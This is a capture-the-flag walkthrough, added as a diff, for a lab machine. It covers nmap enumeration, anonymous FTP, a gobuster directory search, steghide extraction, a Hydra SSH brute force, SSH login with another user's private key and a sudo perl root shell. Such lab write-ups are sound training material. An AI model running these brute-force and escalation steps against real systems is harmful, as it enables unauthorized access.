@@ -1,0 +1,103 @@
+==> Deploy The Machine
+
+==> Enumuration
+          ==> Scan with NMAP - nmap -sV (IP)
+                   The Open Ports Are 
+                       1.FTP -Anonymous Login Allowed
+                       2.SSH
+                       3.HTTP
+
+==> Connect Ftp Using Anonymous Login....
+
+==> After Connected Give The Command ls
+
+==> We Will See The Picture trytofing.jpg
+
+==> Download The Picture - get trytofind.jpg
+
+==> Now Lets See The Port 80
+
+==> There Has No information In This Page
+
+==> So Lets Start Directory BruteForce Using Gobuster
+
+==> gobuster dir -u http://(ip) -w /usr/share/wordlists/dirb/common.txt
+
+==> Found one Directory Called blogs
+
+==> Try it . http://(ip)/blogs
+
+==> There Has Some Text . view Page Source. Yeah we got a Hint.
+
+==> The Hint is There Has a Hidden Directory - S3cr3t-T3xt
+
+==> Then Try http://(ip)/S3cr3t-T3xt
+
+==> There Is Nothing In This Page. Next Try To View Page Source
+
+==> We See The Secret Key in Last
+
+==>Save The Key....
+
+==> Already We Download a JPG image.
+
+==> if image have Stegnography?
+
+==> Try it. 
+
+==> i'm Using Steghide Tool. steghide extract -sf trytofind.jpg -xf extractdata
+
+==> o/p is Saved In extractdata .Now Read The Data 
+
+==> cat extractdata 
+
+==> o/p is Hello.....  renu
+
+      I tell you something Important.Your Password is too Week So Change Your Password
+Don't Underestimate it.......
+
+==> Now we Know The renu Password is Too week
+
+==> Lets Bruteforce Using Hydra 
+
+==> hydra -l renu -P /usr/share/wordlists/rockyou.txt (ip) ssh -t 4
+
+==>And The Password Is 987654321
+
+==> Lets Connect SSH - ssh renu@(ip) 
+
+==> Successfully Logined
+
+==> Then ls . Yeah We Got a user1 Flag
+
+==> Move To Home Directory. cd /home
+
+==> There Has Two users lily&renu
+
+==> renu Has No sudoers . Try to Move lily User
+
+==> command cd . There Has .ssh Directory . Then cd .ssh
+
+==> We have id_rsa Key
+
+==> Connect ssh to lily using Key. ssh lily@(ip) -i id_rsa
+
+==>Successfully Logined
+
+==> execute ls . We Got A user2 Flag
+
+==> Then Execute sudo -l 
+
+==> The lily user Have sudo rights for /usr/bin/perl
+
+==> The Command for Priv Esc using Perl 
+
+==> sudo perl -e 'exec "/bin/bash";'
+
+==> Yeah We Got a Root Shell
+
+==> Move To Root Directory
+
+==> Type ls -la . The Root Flag is Hidden .
+
+.......................*****........................
